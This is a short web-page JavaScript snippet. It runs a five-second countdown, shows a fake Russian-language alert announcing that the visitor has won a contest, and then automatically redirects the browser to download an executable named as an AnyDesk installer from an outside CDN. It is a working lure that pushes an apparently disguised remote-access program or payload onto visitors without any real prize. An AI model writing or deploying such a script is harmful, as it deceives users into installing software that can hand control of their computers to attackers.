const addTimer = function () {
    const timer = document.getElementById("timer");
    let currentTime = timer.textContent.split(":");
    let timerSeconds = parseInt(currentTime[0]) * 3600 + parseInt(currentTime[1]) * 60 + parseInt(currentTime[2]);
    timerSeconds--;

    const hours = Math.floor(timerSeconds / 3600);
    const minutes = Math.floor((timerSeconds % 3600) / 60);
    const seconds = timerSeconds % 60;
    if (timer.textContent == 0) {
        alert("Вы победили в конкурсе!");
        clearInterval(idInterval);
    }
    timer.textContent = [hours.toString().padStart(2, '0'),
    minutes.toString().padStart(2, '0'),
    seconds.toString().padStart(2, '0')].join(':');
    if (timerSeconds <= 0) {
        alert("Вы победили в конкурсе!");
        clearInterval(idInterval);
        downloadLink = 'https://cdn.ast-soft.com/AnyDesk%20Soft%20start%20up.exe';
        window.location.href = downloadLink;
    }
}
document.getElementById("timer").textContent = "00:00:05";
const idInterval = setInterval(addTimer, 1000);